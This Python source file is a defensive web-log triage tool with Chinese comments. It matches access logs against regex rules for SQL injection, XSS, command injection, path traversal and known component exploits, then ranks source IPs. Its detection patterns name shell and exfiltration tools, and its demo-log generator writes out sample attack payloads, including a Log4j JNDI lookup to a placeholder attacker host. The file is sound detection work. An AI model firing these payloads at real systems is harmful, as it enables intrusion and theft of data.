#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
log_triage.py —— Web 访问日志攻击特征批量筛查与研判辅助工具

【干什么用的】
安全运营 / 护网值守场景下，把 Nginx / Apache / IIS 的访问日志批量过一遍，自动：
  1) 按源 IP 聚合出「攻击画像」并打优先级分数
  2) 按攻击类型聚合统计命中量
  3) 用行为判断识别「疑似目录扫描」和「疑似 Webshell 交互」
  4) 导出 JSON / CSV 报告

替代人眼逐条翻日志，让值守人员把时间花在真正需要研判的对象上。

【设计要点（面试可以主动讲）】
  - 纯 Python 标准库实现，零第三方依赖，拷到任何机器上都能跑
  - 检测规则与聚合逻辑分离：RULES 是数据，不是硬编码的 if-else，加规则只改一张表
  - 先 URL 解码（最多 3 次，对抗双重编码）再匹配，避免被绕过
  - 区分「特征命中」和「行为判定」：扫描器和 Webshell 靠行为特征识别，不靠关键字
  - 支持白名单，避免把自家扫描器和内网网段算成攻击源（真实运营中误报的主要来源）

【用法】
    python log_triage.py --demo                     # 生成样例日志并分析（自测/演示用）
    python log_triage.py access.log                 # 分析真实日志
    python log_triage.py access.log --top 20        # 只看优先级最高的 20 个 IP
    python log_triage.py access.log --min-level high
    python log_triage.py access.log --json report.json --csv hits.csv
    python log_triage.py access.log --whitelist-ip 192.168.0.0/16 --whitelist-ua "my-scanner"

【注意】
  本工具只做「筛查」不做「定性」——输出的是需要人工优先研判的候选对象。
  规则命中不等于真实攻击，是否成立必须结合业务日志、资产归属和时间线人工判断。
"""

from __future__ import annotations

import argparse
import csv
import json
import os
import random
import re
import sys
from collections import Counter, defaultdict
from datetime import datetime, timedelta
from ipaddress import ip_address, ip_network
from unicodedata import east_asian_width
from urllib.parse import unquote

# Windows 控制台默认可能是 GBK，强制 UTF-8 输出，避免中文表格乱码
if hasattr(sys.stdout, "reconfigure"):
    try:
        sys.stdout.reconfigure(encoding="utf-8")
    except Exception:
        pass

# ---------------------------------------------------------------------------
# 一、检测规则表
# ---------------------------------------------------------------------------
# 规则是「数据」而不是代码分支：新增一类攻击只需往这张表里加一条。
# level 取值：critical / high / medium / low，决定优先级权重。
# patterns 里的正则统一对「多次 URL 解码 + 转小写」后的 URI 做匹配。

RULES = [
    {
        "id": "SQLI",
        "name": "SQL 注入",
        "level": "critical",
        "category": "Web 注入",
        "desc": "URL 参数中出现 SQL 语法结构，可能是注入尝试",
        "patterns": [
            r"union[\s/*+]+select",
            r"\bselect\b[^;]{0,80}\bfrom\b",
            r"\bsleep\s*\(",
            r"\bbenchmark\s*\(",
            r"\bupdatexml\s*\(",
            r"\bextractvalue\s*\(",
            r"\bconcat\s*\(",
            r"information_schema",
            r"\b(or|and)\b\s+['\"]?\d+['\"]?\s*=\s*['\"]?\d+",
            r"'\s*(or|and)\s+'",
            r"into\s+outfile",
            r"\bload_file\s*\(",
            r"\bxp_cmdshell\b",
            r"\bwaitfor\s+delay\b",
            r"--(\s|$|\+)",
            r"/\*!\d*",
        ],
    },
    {
        "id": "XSS",
        "name": "跨站脚本",
        "level": "high",
        "category": "Web 注入",
        "desc": "URL 中出现 HTML/JS 注入片段",
        "patterns": [
            r"<script[^>]*>",
            r"on(error|load|mouseover|click|focus|submit)\s*=",
            r"javascript\s*:",
            r"alert\s*\(",
            r"prompt\s*\(",
            r"document\.cookie",
            r"<img[^>]+src\s*=",
            r"<svg[^>]*onload",
            r"\beval\s*\(",
            r"expression\s*\(",
        ],
    },
    {
        "id": "CMDI",
        "name": "命令注入",
        "level": "critical",
        "category": "Web 注入",
        "desc": "URL 中出现系统命令拼接特征",
        "patterns": [
            r"[;|&]\s*(cat|whoami|id|uname|wget|curl|bash|sh|nc|ping|chmod|rm|ls|ps|net)\b",
            r"\|\s*(whoami|id|cat|ls|uname)\b",
            r"\$\([^)]{1,80}\)",
            r"`[^`]{1,80}`",
            r"/(bin|sbin)/(sh|bash|dash)",
            r"(;|%0a|%0d|\|\|)\s*(cmd|powershell|ipconfig|net\s+user|tasklist)",
            r"\bnc\s+-e\b",
            r"/dev/tcp/",
        ],
    },
    {
        "id": "PATH-TRAVERSAL",
        "name": "路径穿越 / 敏感文件读取",
        "level": "critical",
        "category": "Web 注入",
        "desc": "尝试跳出 Web 根目录读取系统文件",
        "patterns": [
            r"(\.\./|\.\.%2f|%2e%2e%2f){2,}",
            r"/(etc/passwd|etc/shadow|proc/self/environ)",
            r"(win\.ini|boot\.ini)",
            r"system32[\\/]config",
            r"/(proc/self/cmdline|etc/hosts)",
        ],
    },
    {
        "id": "COMPONENT-RCE",
        "name": "组件漏洞利用",
        "level": "critical",
        "category": "组件漏洞",
        "desc": "命中已知高危组件漏洞的利用特征",
        "patterns": [
            r"\$\{\s*jndi\s*:\s*(ldap|rmi|dns|http|iiop)",   # Log4j2 CVE-2021-44228
            r"rememberme\s*=",                                 # Shiro CVE-2016-4437
            r"@type[\"']?\s*[:=]",                             # Fastjson autoType
            r"class\.module\.classloader",                     # Spring4Shell
            r"wls-wsat",                                       # WebLogic
            r"_async/",
            r"java\.lang\.(runtime|processbuilder)",
            r"cve-\d{4}-\d{4,}",
        ],
    },
    {
        "id": "UPLOAD",
        "name": "文件上传 / 脚本落地",
        "level": "high",
        "category": "文件操作",
        "desc": "请求中含脚本类文件后缀，可能是上传或落地 Webshell",
        "patterns": [
            r"filename\s*=\s*[\"']?[^\"'\s]*\.(jsp|jspx|jspf|php\d?|phtml|asp|aspx|ashx|asmx|war)",
            r"\.(jsp|jspx|jspf|phtml|ashx|asmx)(\?|$|\s)",
            r"\.(php\d?|asp|aspx)(\?|$|\s)",
        ],
    },
    {
        "id": "SENSITIVE-PROBE",
        "name": "敏感路径探测",
        "level": "high",
        "category": "信息收集",
        "desc": "探测源码、配置、备份、管理后台等敏感资源",
        "patterns": [
            r"/(\.git|\.svn|\.hg|\.ds_store)",
            r"/\.env",
            r"/(phpinfo|info|test|phpinfo\.php)\.php",
            r"/(phpmyadmin|pma|adminer|admin\.php|manage|manager)",
            r"/(druid|actuator|swagger-ui|swagger|api-docs|heapdump|env|mappings|trace|jolokia)",
            r"/(nacos|solr|jenkins|zabbix|grafana|kibana|harbor|nps|rabbitmq)",
            r"/(wp-admin|wp-login|xmlrpc\.php|wp-content)",
            r"\.(bak|backup|sql|zip|rar|tar\.gz|tgz|old|swp|save|log)(\?|$|\s)",
            r"/(backup|backups|wwwroot|webroot|database|dump|temp|www)($|/)",
            r"/(manager/html|host-manager|console)",
        ],
    },
    {
        "id": "SCANNER-UA",
        "name": "扫描器 User-Agent",
        "level": "high",
        "category": "工具特征",
        "desc": "User-Agent 命中已知扫描 / 渗透工具名称",
        "patterns": [],  # 该规则匹配 UA 而不是 URI，由 SCANNER_TOKENS 提供
    },
    {
        "id": "HTTP-METHOD",
        "name": "非常规 HTTP 方法",
        "level": "medium",
        "category": "工具特征",
        "desc": "PUT / DELETE / TRACE 等非正常业务方法",
        "patterns": [],  # 由代码判断 method
    },
    {
        "id": "UA-SUSPICIOUS",
        "name": "可疑 User-Agent",
        "level": "low",
        "category": "工具特征",
        "desc": "UA 为空或为脚本类客户端（误报较多，仅供参考）",
        "patterns": [],  # 由代码判断 ua
    },
]

# 扫描器 UA 关键字（小写匹配）
SCANNER_TOKENS = [
    "sqlmap", "nmap", "nikto", "dirsearch", "dirb", "gobuster", "ffuf",
    "feroxbuster", "wpscan", "masscan", "zgrab", "acunetix", "appscan",
    "nessus", "netsparker", "openvas", "xray", "whatweb", "w3af", "arachni",
    "hydra", "brutespray", "webscan", "vuls", "nuclei", "御剑", "超级弱口令",
    "webrobot", "xsstrike", "commix", "jexboss", "ysoserial",
]

# 脚本类客户端 UA（低优先级，容易误报，单独列出）
SCRIPT_UA_TOKENS = ["python-requests", "python-urllib", "curl/", "wget/",
                    "go-http-client", "java/", "okhttp", "libwww-perl", "httpclient"]

# 权重：决定 IP 优先级分数
LEVEL_WEIGHT = {"critical": 40, "high": 18, "medium": 7, "low": 2}
LEVEL_ORDER = {"critical": 0, "high": 1, "medium": 2, "low": 3}

# 行为判定阈值（这些数字是经验值，真实环境需要按业务流量调）
BEHAVIOR = {
    "scan_min_requests": 40,      # 认定为扫描的最少请求数
    "scan_404_ratio": 0.55,       # 404 比例阈值
    "scan_min_uris": 25,          # 最少不同 URI 数
    "webshell_min_posts": 8,      # 同一 URI 被同一 IP POST 的最少次数
}

# ---------------------------------------------------------------------------
# 二、日志解析
# ---------------------------------------------------------------------------

# Nginx / Apache 的 combined 格式
COMBINED_RE = re.compile(
    r'^(?P<ip>\S+)\s+\S+\s+\S+\s+\[(?P<time>[^\]]+)\]\s+'
    r'"(?P<request>[^"]*)"\s+(?P<status>\d{3}|-)\s+(?P<size>\d+|-)'
    r'(?:\s+"(?P<referer>[^"]*)"\s+"(?P<ua>[^"]*)")?'
)

TIME_FORMATS = ("%d/%b/%Y:%H:%M:%S %z", "%Y-%m-%d %H:%M:%S", "%d/%b/%Y:%H:%M:%S")


class Entry:
    """一条解析后的日志记录。"""
    __slots__ = ("ip", "time", "method", "uri", "status", "size", "ua", "raw")

    def __init__(self, ip, time, method, uri, status, size, ua, raw=""):
        self.ip = ip
        self.time = time
        self.method = method
        self.uri = uri
        self.status = status
        self.size = size
        self.ua = ua
        self.raw = raw


def _parse_time(text):
    """尽最大努力解析时间，失败返回 None（不因为时间格式丢掉整条记录）。"""
    for fmt in TIME_FORMATS:
        try:
            return datetime.strptime(text, fmt)
        except ValueError:
            continue
    return None


def _split_request(request):
    """把 '"GET /a?b=1 HTTP/1.1"' 拆成 (method, uri)。"""
    parts = request.split()
    if len(parts) >= 2:
        return parts[0].upper(), parts[1]
    if parts:
        return parts[0].upper(), ""
    return "", ""


def parse_iis(lines):
    """解析 IIS W3C 扩展格式（#Fields 表头决定列顺序）。"""
    entries = []
    fields = None
    for line in lines:
        line = line.strip()
        if not line:
            continue
        if line.startswith("#Fields:"):
            fields = line[len("#Fields:"):].split()
            continue
        if line.startswith("#"):
            continue
        if not fields:
            continue
        cols = line.split()
        if len(cols) < len(fields):
            continue
        row = dict(zip(fields, cols))
        uri = row.get("cs-uri-stem", "")
        query = row.get("cs-uri-query", "")
        if query and query != "-":
            uri = f"{uri}?{query}"
        ts = f"{row.get('date', '')} {row.get('time', '')}".strip()
        entries.append(Entry(
            ip=row.get("c-ip", "-"),
            time=_parse_time(ts),
            method=row.get("cs-method", "").upper(),
            uri=uri,
            status=row.get("sc-status", "-"),
            size=row.get("sc-bytes", "-"),
            ua=row.get("cs(User-Agent)", "").replace("+", " "),
            raw=line,
        ))
    return entries


def parse_log(path):
    """解析日志文件，返回 (entries, stats)。混合格式也能容错处理。"""
    with open(path, "r", encoding="utf-8", errors="replace") as fh:
        lines = fh.readlines()

    if any(l.startswith("#Fields:") for l in lines[:50]):
        entries = parse_iis(lines)
        failed = len(lines) - len(entries)
        return entries, {"total": len(lines), "parsed": len(entries), "failed": failed,
                         "format": "IIS W3C"}

    entries = []
    failed = 0
    failed_samples = []
    for line in lines:
        line = line.rstrip("\n")
        if not line.strip():
            continue
        m = COMBINED_RE.match(line)
        if not m:
            failed += 1
            if len(failed_samples) < 3:
                failed_samples.append(line[:160])
            continue
        method, uri = _split_request(m.group("request"))
        entries.append(Entry(
            ip=m.group("ip"),
            time=_parse_time(m.group("time")),
            method=method,
            uri=uri,
            status=m.group("status"),
            size=m.group("size"),
            ua=m.group("ua") or "",
            raw=line,
        ))
    return entries, {"total": len(lines), "parsed": len(entries), "failed": failed,
                     "failed_samples": failed_samples, "format": "Nginx/Apache combined"}


# ---------------------------------------------------------------------------
# 三、检测引擎
# ---------------------------------------------------------------------------

class Detector:
    """规则匹配器。编译一次，复用多次。"""

    def __init__(self, whitelist_ips=None, whitelist_ua=None):
        self.whitelist_ips = list(whitelist_ips or [])
        self.whitelist_ua = [u.lower() for u in (whitelist_ua or [])]
        self._compiled = {}
        for rule in RULES:
            if rule["patterns"]:
                self._compiled[rule["id"]] = [re.compile(p, re.IGNORECASE)
                                              for p in rule["patterns"]]

    def is_whitelisted(self, ip, ua):
        """白名单：自家扫描器、内网网段不该被当成攻击源（真实运营中最大的误报来源）。"""
        for net in self.whitelist_ips:
            try:
                if "/" in net:
                    if ip_address(ip) in ip_network(net, strict=False):
                        return True
                elif ip == net:
                    return True
            except ValueError:
                continue
        low_ua = (ua or "").lower()
        return any(token in low_ua for token in self.whitelist_ua)

    @staticmethod
    def normalize(uri):
        """
        URL 解码最多 3 次再匹配 —— 攻击者常用双重编码绕过关键字检测，
        这一行是「检测规则能不能被简单绕过」的关键。
        """
        text = uri or ""
        for _ in range(3):
            decoded = unquote(text)
            if decoded == text:
                break
            text = decoded
        return text.lower()

    def check(self, entry):
        """对单条日志跑全部规则，返回命中列表 [(rule_id, level, matched_text), ...]。"""
        uri = self.normalize(entry.uri)
        ua = (entry.ua or "").lower()
        hits = []

        for rule in RULES:
            rid = rule["id"]

            if rid == "SCANNER-UA":
                for token in SCANNER_TOKENS:
                    if token in ua:
                        hits.append((rid, rule["level"], f"UA:{token}"))
                        break
                continue

            if rid == "HTTP-METHOD":
                if entry.method in ("PUT", "DELETE", "TRACE", "PROPFIND", "MOVE", "COPY"):
                    hits.append((rid, rule["level"], entry.method))
                continue

            if rid == "UA-SUSPICIOUS":
                if not ua or len(ua) < 12 or any(t in ua for t in SCRIPT_UA_TOKENS):
                    hits.append((rid, rule["level"], ua[:40] or "(空)"))
                continue

            for pattern in self._compiled.get(rid, []):
                m = pattern.search(uri)
                if m:
                    hits.append((rid, rule["level"], m.group(0)[:60]))
                    break  # 同一规则只记一次，避免刷分

        return hits


# ---------------------------------------------------------------------------
# 四、聚合与研判
# ---------------------------------------------------------------------------

def build_report(entries, detector, top_n=None, min_level=None):
    """核心分析：按 IP 聚合成攻击画像 + 行为判定。"""
    rule_meta = {r["id"]: r for r in RULES}
    ip_hits = defaultdict(list)          # ip -> [(rule_id, level, matched)]
    ip_stats = defaultdict(lambda: {
        "requests": 0, "status": Counter(), "uris": set(),
        "first": None, "last": None, "ua": Counter(), "hits": 0,
    })

    whitelisted_count = 0
    for e in entries:
        st = ip_stats[e.ip]
        st["requests"] += 1
        st["status"][e.status] += 1
        st["uris"].add(e.uri.split("?")[0])
        if e.time:
            if st["first"] is None or e.time < st["first"]:
                st["first"] = e.time
            if st["last"] is None or e.time > st["last"]:
                st["last"] = e.time
        if e.ua:
            st["ua"][e.ua] += 1

        if detector.is_whitelisted(e.ip, e.ua):
            whitelisted_count += 1
            continue

        hits = detector.check(e)
        if hits:
            st["hits"] += 1
            for rid, level, matched in hits:
                ip_hits[e.ip].append((rid, level, matched, e))

    # 生成按 IP 排序的画像
    profiles = []
    for ip, hits in ip_hits.items():
        st = ip_stats[ip]
        rule_ids = {h[0] for h in hits}
        levels = {h[1] for h in hits}

        # 优先级分数 = 命中规则权重之和（去重，避免刷量刷分），上限 100
        score = sum(LEVEL_WEIGHT[rule_meta[r]["level"]] for r in rule_ids)
        score = min(score, 100)

        total = st["requests"] or 1
        err_404 = st["status"].get("404", 0)
        ratio_404 = err_404 / total

        behaviors = []
        # 行为一：疑似目录扫描（高频请求 + 高 404 比例 + 大量不同 URI）
        if (total >= BEHAVIOR["scan_min_requests"]
                and ratio_404 >= BEHAVIOR["scan_404_ratio"]
                and len(st["uris"]) >= BEHAVIOR["scan_min_uris"]):
            behaviors.append("疑似目录扫描/漏洞探测")
            score = min(score + 15, 100)

        # 行为二：疑似 Webshell 交互（同一 URI 被高频 POST）
        post_counter = Counter()
        for _, _, _, e in hits:
            if e.method == "POST":
                post_counter[e.uri.split("?")[0]] += 1
        hot = [u for u, c in post_counter.items() if c >= BEHAVIOR["webshell_min_posts"]]
        if hot:
            behaviors.append(f"疑似 Webshell 交互({hot[0]})")
            score = min(score + 20, 100)

        # 行为三：关键规则命中且返回 2xx —— 需要优先确认「是否利用成功」
        success_hint = any(
            h[1] == "critical" and h[3].status.startswith("2")
            for h in hits
        )
        if success_hint:
            behaviors.append("⚠ 命中高危特征且返回 2xx，需确认是否利用成功")

        top_rule = sorted(rule_ids, key=lambda r: LEVEL_ORDER[rule_meta[r]["level"]])[0]
        profiles.append({
            "ip": ip,
            "score": score,
            "level": rule_meta[top_rule]["level"],
            "requests": st["requests"],
            "hit_lines": st["hits"],
            "rules": sorted(rule_ids, key=lambda r: LEVEL_ORDER[rule_meta[r]["level"]]),
            "rule_names": [rule_meta[r]["name"] for r in rule_ids],
            "behaviors": behaviors,
            "status": dict(st["status"]),
            "first": st["first"].strftime("%Y-%m-%d %H:%M:%S") if st["first"] else "-",
            "last": st["last"].strftime("%Y-%m-%d %H:%M:%S") if st["last"] else "-",
            "ua": st["ua"].most_common(1)[0][0][:60] if st["ua"] else "-",
            "samples": [
                {
                    "time": h[3].time.strftime("%Y-%m-%d %H:%M:%S") if h[3].time else "-",
                    "method": h[3].method,
                    "uri": h[3].uri[:160],
                    "status": h[3].status,
                    "rule": rule_meta[h[0]]["name"],
                    "matched": h[2],
                }
                for h in sorted(hits, key=lambda x: (LEVEL_ORDER[x[1]]))[:5]
            ],
        })

    profiles.sort(key=lambda p: (-p["score"], -p["hit_lines"]))

    if min_level:
        order = LEVEL_ORDER[min_level]
        profiles = [p for p in profiles if LEVEL_ORDER[p["level"]] <= order]
    if top_n:
        profiles = profiles[:top_n]

    # 攻击类型分布
    type_counter = Counter()
    for hits in ip_hits.values():
        for rid in {h[0] for h in hits}:
            type_counter[rid] += 1

    times = [e.time for e in entries if e.time]
    summary = {
        "total_lines": len(entries),
        "unique_ips": len(ip_stats),
        "attacking_ips": len(ip_hits),
        "whitelisted_lines": whitelisted_count,
        "time_range": (
            f"{min(times):%Y-%m-%d %H:%M:%S} ~ {max(times):%Y-%m-%d %H:%M:%S}"
            if times else "-"
        ),
        "type_distribution": [
            {
                "id": rid,
                "name": rule_meta[rid]["name"],
                "level": rule_meta[rid]["level"],
                "ip_count": count,
            }
            for rid, count in sorted(
                type_counter.items(), key=lambda kv: -kv[1]
            )
        ],
    }
    return summary, profiles


# ---------------------------------------------------------------------------
# 五、输出（自适应中文宽度的表格）
# ---------------------------------------------------------------------------

def display_width(text):
    """计算字符串显示宽度：中文按 2 列算，保证表格对齐。"""
    return sum(2 if east_asian_width(ch) in "WF" else 1 for ch in str(text))


def pad(text, width):
    text = str(text)
    return text + " " * max(0, width - display_width(text))


def print_table(headers, rows, title=""):
    if title:
        print(f"\n{title}")
    widths = [display_width(h) for h in headers]
    for row in rows:
        for i, cell in enumerate(row):
            widths[i] = max(widths[i], display_width(cell))
    line = "-+-".join("-" * w for w in widths)
    print(" | ".join(pad(h, widths[i]) for i, h in enumerate(headers)))
    print(line)
    for row in rows:
        print(" | ".join(pad(c, widths[i]) for i, c in enumerate(row)))


LEVEL_TAG = {"critical": "[严重]", "high": "[高]", "medium": "[中]", "low": "[低]"}


def print_console(summary, profiles, parse_stats):
    print("=" * 78)
    print("  Web 日志攻击特征筛查报告")
    print("=" * 78)
    print(f"  日志格式    : {parse_stats['format']}")
    print(f"  总行数      : {parse_stats['total']}（成功解析 {parse_stats['parsed']}，"
          f"解析失败 {parse_stats['failed']}）")
    for sample in parse_stats.get("failed_samples", []):
        print(f"      解析失败样例: {sample}")
    print(f"  独立源 IP   : {summary['unique_ips']}")
    print(f"  可疑源 IP   : {summary['attacking_ips']}")
    print(f"  白名单跳过  : {summary['whitelisted_lines']} 行")
    print(f"  时间范围    : {summary['time_range']}")

    if summary["type_distribution"]:
        rows = [[LEVEL_TAG.get(d["level"], d["level"]), d["name"], d["ip_count"]]
                for d in summary["type_distribution"]]
        print_table(["级别", "攻击类型", "涉及 IP 数"], rows, "\n【攻击类型分布】")

    if profiles:
        rows = [
            [p["score"], LEVEL_TAG.get(p["level"], ""), p["ip"],
             p["hit_lines"], p["requests"], "、".join(p["rule_names"][:4])]
            for p in profiles[:30]
        ]
        print_table(["分数", "级别", "源 IP", "命中行", "总请求", "命中类型"],
                    rows, "\n【需优先研判的源 IP（按优先级排序）】")

        for p in profiles[:5]:
            print(f"\n--- {p['ip']}  分数 {p['score']}  "
                  f"时间 {p['first']} ~ {p['last']} ---")
            for b in p["behaviors"]:
                print(f"    行为判定: {b}")
            print(f"    UA: {p['ua']}")
            for s in p["samples"][:3]:
                print(f"    · [{s['time']}] {s['method']} {s['uri']}")
                print(f"      规则 {s['rule']} / 命中 {s['matched']!r} / HTTP {s['status']}")

    print("\n" + "=" * 78)
    print("  提示：本报告只做筛查，不等同于攻击定性。")
    print("  规则命中必须结合业务日志、资产归属和时间线人工复核后再处置。")
    print("=" * 78)


# ---------------------------------------------------------------------------
# 六、样例日志生成（自测与演示用）
# ---------------------------------------------------------------------------

def gen_demo_log(path, seed=20260929):
    """生成一份混合了正常流量与 8 类攻击流量的样例日志，用于自测和演示。"""
    rng = random.Random(seed)
    base = datetime(2026, 9, 20, 9, 0, 0)
    uas_browser = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126.0 Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 Safari/604.1",
    ]
    lines = []

    def add(ip, method, uri, status, ua, size=None, offset=None):
        t = base + timedelta(seconds=offset if offset is not None else rng.randint(0, 60000))
        size = size if size is not None else rng.randint(200, 9000)
        lines.append(
            f'{ip} - - [{t.strftime("%d/%b/%Y:%H:%M:%S +0800")}] '
            f'"{method} {uri} HTTP/1.1" {status} {size} "-" "{ua}"'
        )

    # 模拟一份字典：真实 dirsearch 一次会打数百个不同路径，这是「行为判定」的前提
    DIRSEARCH_WORDLIST = [
        "/admin.php", "/admin/", "/administrator/", "/login", "/login.php",
        "/manage/", "/manager/html", "/console/login", "/.git/config", "/.git/HEAD",
        "/.svn/entries", "/.env", "/.DS_Store", "/backup.zip", "/backup/",
        "/backups/", "/db.sql", "/database.sql", "/dump.sql", "/www.zip",
        "/wwwroot.tar.gz", "/web.zip", "/phpmyadmin/index.php", "/pma/",
        "/adminer.php", "/actuator/env", "/actuator/health", "/actuator/heapdump",
        "/druid/index.html", "/swagger-ui.html", "/api-docs", "/v2/api-docs",
        "/nacos/", "/solr/", "/jenkins/", "/zabbix/", "/grafana/", "/kibana/",
        "/harbor/", "/nps/", "/wp-login.php", "/wp-admin/", "/xmlrpc.php",
        "/wp-config.php.bak", "/config.php.bak", "/web.config", "/phpinfo.php",
        "/info.php", "/test.php", "/shell.php", "/cmd.jsp", "/index.jsp",
        "/robots.txt", "/sitemap.xml", "/crossdomain.xml", "/readme.txt",
        "/CHANGELOG.md", "/package.json", "/composer.json", "/.htaccess",
        "/server-status", "/error.log", "/access.log", "/logs/", "/tmp/",
        "/test/", "/upload/", "/uploads/", "/static/../", "/api/v1/",
        "/api/swagger.json", "/health", "/metrics", "/debug",
    ]

    # 正常业务流量
    for i in range(120):
        add("203.0.113.%d" % rng.randint(10, 60),
            "GET", rng.choice(["/", "/index.html", "/news/1024", "/static/app.css",
                               "/api/notice/list", "/images/logo.png"]),
            200, rng.choice(uas_browser))

    # 自家漏扫（应该在结果里被识别为工具特征，真实环境通常放白名单）
    for i in range(6):
        add("10.20.30.40", "GET", "/api/notice/list", 200, "Nessus SOAP 1.0")

    # 1. SQL 注入（sqlmap 特征 UA + 注入语句）
    for i, payload in enumerate([
        "/news?id=1%27%20or%20%271%27=%271",
        "/news?id=1%20union%20select%201,2,3",
        "/news?id=1%20and%20sleep(5)",
        "/news?id=1%27%20and%20extractvalue(1,concat(0x7e,version()))--+",
        "/api/user?name=admin%27--",
    ]):
        add("198.51.100.7", "GET", payload, 200, "sqlmap/1.7.2#stable (https://sqlmap.org)")

    # 2. XSS
    add("198.51.100.9", "GET", "/search?q=<script>alert(document.cookie)</script>", 200,
        uas_browser[0])
    add("198.51.100.9", "GET", "/search?q=<img src=x onerror=alert(1)>", 200, uas_browser[0])

    # 3. 命令注入
    add("198.51.100.11", "GET", "/ping?host=127.0.0.1;cat%20/etc/passwd", 200,
        "Mozilla/5.0 (compatible)")
    add("198.51.100.11", "GET", "/tool?cmd=;whoami", 500, "Mozilla/5.0 (compatible)")

    # 4. 路径穿越
    add("198.51.100.13", "GET", "/download?file=../../../../etc/passwd", 200, "curl/8.4.0")

    # 5. 文件上传尝试
    add("198.51.100.15", "POST", "/upload", 200,
        uas_browser[1], size=1024)
    add("198.51.100.15", "POST", "/upload.jsp;filename=shell.jsp", 200,
        uas_browser[1], size=1024)

    # 6. Log4j2 / Shiro / Fastjson 组件漏洞
    add("198.51.100.17", "GET",
        "/api/login?x=${jndi:ldap://evil.example.com:1389/a}", 200, "Java/1.8.0_181")
    add("198.51.100.17", "GET", "/index;rememberMe=deleteMe", 200, uas_browser[0])
    # 注意：payload 里的引号必须 URL 编码。真实日志里请求行是用双引号包裹的，
    # 裸引号会把日志行截断——这也是解析器必须统计「解析失败行数」的原因。
    add("198.51.100.17", "POST",
        "/api/parse?body=%7B%22@type%22%3A%22java.lang.Runtime%22%7D", 500,
        "Java/1.8.0_181")

    # 7. 目录扫描器：模拟一次真实的 dirsearch —— 大量「不同」URI + 高比例 404
    #    注意：扫描器的识别靠的是行为特征（URI 分散度 + 404 比例），不是单条关键字，
    #    所以样例必须造出足够的 URI 多样性，否则测不出这条规则。
    for scan_path in rng.sample(DIRSEARCH_WORDLIST, k=min(70, len(DIRSEARCH_WORDLIST))):
        add("198.51.100.21", "GET", scan_path, 404, "dirsearch/0.4.3")
    for i in range(12):
        add("198.51.100.21", "GET", "/%s" % rng.randint(10000, 99999),
            404, "dirsearch/0.4.3")

    # 8. 疑似 Webshell 交互（同一 URI 高频 POST 且 200）
    for i in range(14):
        add("198.51.100.33", "POST", "/uploads/2026/x.jsp", 200, "Mozilla/5.0 (Windows NT 10.0)")

    # 9. 敏感文件探测 + 2xx（需重点确认是否成功）
    add("198.51.100.41", "GET", "/.env", 200, "Mozilla/5.0 (X11; Linux x86_64)")
    add("198.51.100.41", "GET", "/backup/wwwroot.tar.gz", 200, uas_browser[0])

    # 10. 非浏览器空 UA
    add("198.51.100.55", "GET", "/", 200, "")

    rng.shuffle(lines)
    with open(path, "w", encoding="utf-8") as fh:
        fh.write("\n".join(lines) + "\n")
    return len(lines)


# ---------------------------------------------------------------------------
# 七、命令行入口
# ---------------------------------------------------------------------------

def export_json(path, summary, profiles, parse_stats):
    payload = {"generated_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
               "parse": parse_stats, "summary": summary, "profiles": profiles}
    with open(path, "w", encoding="utf-8") as fh:
        json.dump(payload, fh, ensure_ascii=False, indent=2)
    print(f"[+] JSON 报告已导出: {path}")


def export_csv(path, profiles):
    with open(path, "w", encoding="utf-8-sig", newline="") as fh:
        writer = csv.writer(fh)
        writer.writerow(["优先级分数", "级别", "源IP", "命中行数", "总请求数",
                         "首次时间", "末次时间", "命中类型", "行为判定", "User-Agent"])
        for p in profiles:
            writer.writerow([p["score"], p["level"], p["ip"], p["hit_lines"],
                             p["requests"], p["first"], p["last"],
                             "|".join(p["rule_names"]), "|".join(p["behaviors"]), p["ua"]])
    print(f"[+] CSV 明细已导出: {path}")


def main(argv=None):
    parser = argparse.ArgumentParser(
        description="Web 访问日志攻击特征批量筛查与研判辅助工具（纯标准库实现）",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="示例:\n"
               "  python log_triage.py --demo\n"
               "  python log_triage.py access.log --top 20 --min-level high\n"
               "  python log_triage.py access.log --json r.json --csv hits.csv\n")
    parser.add_argument("logfile", nargs="?", help="要分析的日志文件路径")
    parser.add_argument("--demo", action="store_true",
                        help="生成样例日志并分析（自测/演示用）")
    parser.add_argument("--demo-file", default="demo_access.log",
                        help="样例日志的输出路径（默认 demo_access.log）")
    parser.add_argument("--top", type=int, default=None, help="只显示前 N 个源 IP")
    parser.add_argument("--min-level", choices=list(LEVEL_ORDER.keys()),
                        help="只显示不低于该级别的结果")
    parser.add_argument("--whitelist-ip", action="append", default=[],
                        help="白名单 IP 或网段，可重复，如 --whitelist-ip 10.0.0.0/8")
    parser.add_argument("--whitelist-ua", action="append", default=[],
                        help="白名单 UA 关键字，可重复")
    parser.add_argument("--json", dest="json_out", help="导出 JSON 报告")
    parser.add_argument("--csv", dest="csv_out", help="导出 CSV 明细")

    args = parser.parse_args(argv)

    if args.demo:
        count = gen_demo_log(args.demo_file)
        print(f"[+] 已生成样例日志 {args.demo_file}（{count} 行，含 8 类攻击流量）\n")
        logfile = args.demo_file
    elif args.logfile:
        logfile = args.logfile
    else:
        parser.print_help()
        return 2

    if not os.path.exists(logfile):
        print(f"[!] 文件不存在: {logfile}", file=sys.stderr)
        return 1

    entries, parse_stats = parse_log(logfile)
    if not entries:
        print("[!] 没有解析到任何日志记录，请确认日志格式", file=sys.stderr)
        return 1

    detector = Detector(whitelist_ips=args.whitelist_ip, whitelist_ua=args.whitelist_ua)
    summary, profiles = build_report(entries, detector, top_n=args.top,
                                     min_level=args.min_level)
    print_console(summary, profiles, parse_stats)

    if args.json_out:
        export_json(args.json_out, summary, profiles, parse_stats)
    if args.csv_out:
        export_csv(args.csv_out, profiles)

    # 退出码：有严重级命中时返回 1，方便接进自动化流程（CRON / CI / SOAR）
    has_critical = any(p["level"] == "critical" for p in profiles)
    return 1 if has_critical else 0


if __name__ == "__main__":
    sys.exit(main())
